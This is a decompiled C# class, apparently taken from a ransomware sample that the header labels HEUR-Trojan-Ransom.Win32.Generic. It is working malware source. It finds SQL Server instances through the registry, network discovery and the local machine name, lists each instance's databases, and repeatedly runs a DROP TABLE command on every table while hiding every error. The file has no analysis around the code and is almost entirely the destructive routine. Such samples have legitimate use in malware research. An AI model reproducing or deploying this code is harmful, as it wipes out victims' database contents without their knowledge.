// Decompiled with JetBrains decompiler
// Type: ns3.Class17
// Assembly: TRM, Version=1.0.4536.20171, Culture=neutral, PublicKeyToken=null
// MVID: CEEA56E5-11FC-4347-A0BD-C051910E6353
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan-Ransom.Win32.Generic-aa3c07db34ce0641fac630d7d72f8dff24de5c64f5ff56d1a6aa57d968d452b5.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Data;
using System.Data.Sql;
using System.Data.SqlClient;

namespace ns3
{
  internal sealed class Class17
  {
    private static readonly string string_0 = "Data Source={0};Initial Catalog=Master;Integrated Security=True;Connect Timeout=20";
    private static readonly string string_1 = "Data Source={0};Initial Catalog={1};Integrated Security=True;Connect Timeout=20";

    public static void smethod_0(string string_2, string string_3)
    {
      using (SqlConnection sqlConnection = new SqlConnection(string.Format(Class17.string_1, (object) string_2, (object) string_3)))
      {
        try
        {
          sqlConnection.Open();
          for (int index = 0; index < 5; ++index)
          {
            try
            {
              using (SqlCommand command = sqlConnection.CreateCommand())
              {
                command.CommandText = "exec sp_MSforeachtable \"DROP TABLE ? \" ";
                command.ExecuteNonQuery();
              }
            }
            catch (Exception ex)
            {
            }
          }
        }
        catch (Exception ex)
        {
        }
      }
    }

    public static List<string> smethod_1(string string_2)
    {
      List<string> stringList = new List<string>();
      using (SqlConnection sqlConnection = new SqlConnection(string.Format(Class17.string_0, (object) string_2)))
      {
        try
        {
          sqlConnection.Open();
          using (SqlCommand command = sqlConnection.CreateCommand())
          {
            command.CommandText = "SELECT name FROM sysdatabases ORDER BY dbid DESC ";
            using (SqlDataReader sqlDataReader = command.ExecuteReader(CommandBehavior.CloseConnection))
            {
              while (sqlDataReader.Read())
              {
                try
                {
                  stringList.Add(sqlDataReader.GetString(0));
                }
                catch
                {
                }
              }
              sqlDataReader.Close();
            }
          }
        }
        catch (Exception ex)
        {
        }
      }
      return stringList;
    }

    public static bool smethod_2(string string_2)
    {
      if (string.IsNullOrEmpty(string_2))
        return false;
      using (SqlConnection sqlConnection = new SqlConnection(string.Format(Class17.string_0, (object) string_2)))
      {
        try
        {
          sqlConnection.Open();
          return true;
        }
        catch (Exception ex)
        {
          return false;
        }
      }
    }

    public static List<string> smethod_3()
    {
      List<string> stringList = Class17.smethod_5();
      foreach (string str in Class17.smethod_4())
      {
        if (!stringList.Contains(str))
          stringList.Add(str);
      }
      return stringList;
    }

    public static List<string> smethod_4()
    {
      List<string> stringList = new List<string>();
      try
      {
        foreach (DataRow row in (InternalDataCollectionBase) SqlDataSourceEnumerator.Instance.GetDataSources().Rows)
        {
          object obj1 = row["ServerName"];
          object obj2 = row["InstanceName"];
          if (obj2 != null && obj2 != DBNull.Value)
            stringList.Add(obj1.ToString() + "\\" + obj2);
          else
            stringList.Add(obj1.ToString());
        }
      }
      catch (Exception ex)
      {
      }
      return stringList;
    }

    public static List<string> smethod_5()
    {
      List<string> stringList = Class17.smethod_6();
      stringList.Add(Environment.MachineName);
      return stringList;
    }

    private static List<string> smethod_6()
    {
      string machineName = Environment.MachineName;
      List<string> stringList = new List<string>();
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Microsoft SQL Server\\Instance Names");
        try
        {
          foreach (string subKeyName in registryKey.GetSubKeyNames())
          {
            foreach (string valueName in registryKey.OpenSubKey(subKeyName).GetValueNames())
            {
              if (!string.IsNullOrEmpty(valueName))
                stringList.Add(machineName + "\\" + valueName);
            }
          }
        }
        finally
        {
          registryKey.Close();
        }
      }
      catch (Exception ex)
      {
      }
      return stringList;
    }
  }
}
